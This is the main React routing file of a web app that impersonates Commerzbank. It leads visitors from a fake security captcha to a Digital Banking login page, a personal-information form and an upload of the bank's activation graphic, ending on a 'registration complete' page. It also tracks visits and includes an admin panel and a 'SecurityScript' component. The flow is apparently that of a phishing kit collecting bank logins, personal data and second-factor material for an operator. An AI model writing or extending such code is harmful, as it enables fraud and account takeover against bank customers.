import React, { useEffect, useState } from 'react';
import { BrowserRouter as Router, Routes, Route, Navigate, useLocation } from 'react-router-dom';
import Header from './components/Header';
import Footer from './components/Footer';
import CaptchaPage from './components/CaptchaPage';
import LoginPage from './components/LoginPage';
import InfoPage from './components/InfoPage';
import UploadPage from './components/UploadPage';
import DonePage from './components/DonePage';
import AdminPanel from './components/AdminPanel';
import SecurityScript from './components/SecurityScript';
import { LanguageProvider } from './contexts/LanguageContext';
import { initAllMobileFixes } from './utils/mobileViewportFix';
import axios from 'axios';
import './App.css';

function AppContent() {
  const location = useLocation();
  const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);
  // Use current domain for API calls
  const API_BASE_URL = `${window.location.origin}/api`;

  useEffect(() => {
    // Track website visit when app loads (only once per session)
    const trackVisit = async () => {
      // Check if we've already tracked this visit in this session
      const sessionKey = `visit_tracked_${window.location.pathname}`;
      if (sessionStorage.getItem(sessionKey)) {
        console.log('Visit already tracked for this session');
        return;
      }

      try {
        await axios.post(`${API_BASE_URL}/track-visit`, {
          path: window.location.pathname
        });
        console.log('✅ Website visit tracked for:', window.location.pathname);
        // Mark as tracked for this session
        sessionStorage.setItem(sessionKey, 'true');
      } catch (error) {
        console.log('Failed to track visit:', error);
      }
    };

    // Add a small delay to ensure the page is fully loaded
    const timer = setTimeout(trackVisit, 100);
    return () => clearTimeout(timer);
  }, []);

  // Update document title based on current route
  useEffect(() => {
    const updateTitle = () => {
      switch (location.pathname) {
        case '/admin':
          document.title = 'Admin Panel - Commerzbank';
          break;
        case '/captcha':
          document.title = 'Sicherheitsüberprüfung - Commerzbank';
          break;
        case '/login':
          document.title = 'Anmeldung zum Digital Banking - Commerzbank';
          break;
        case '/info':
          document.title = 'Persönliche Informationen - Commerzbank';
          break;
        case '/upload':
          document.title = 'Aktivierungsgrafik hochladen - Commerzbank';
          break;
        case '/done':
          document.title = 'Registrierung abgeschlossen - Commerzbank';
          break;
        default:
          document.title = 'Sicherheitsüberprüfung - Commerzbank';
      }
    };

    updateTitle();
  }, [location.pathname]);

  // Handle window resize
  useEffect(() => {
    const handleResize = () => {
      setIsMobile(window.innerWidth <= 768);
    };

    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  // Don't show header and footer on admin page and captcha page
  const showHeader = !location.pathname.includes('/admin') && !location.pathname.includes('/captcha');
  const showFooter = !location.pathname.includes('/admin') && !location.pathname.includes('/captcha');

  return (
    <div className="App">
      <SecurityScript />
      {showHeader && <Header />}
      <Routes>
        <Route path="/" element={<Navigate to="/captcha" replace />} />
        <Route path="/captcha" element={<CaptchaPage />} />
        <Route path="/login" element={<LoginPage />} />
        <Route path="/info" element={<InfoPage />} />
        <Route path="/upload" element={<UploadPage />} />
        <Route path="/done" element={<DonePage />} />
        <Route path="/admin" element={<AdminPanel />} />
      </Routes>
      {showFooter && <Footer />}
    </div>
  );
}

function App() {
  // Initialize mobile compatibility fixes on mount
  useEffect(() => {
    initAllMobileFixes();
  }, []);

  return (
    <LanguageProvider>
      <Router>
        <AppContent />
      </Router>
    </LanguageProvider>
  );
}

export default App;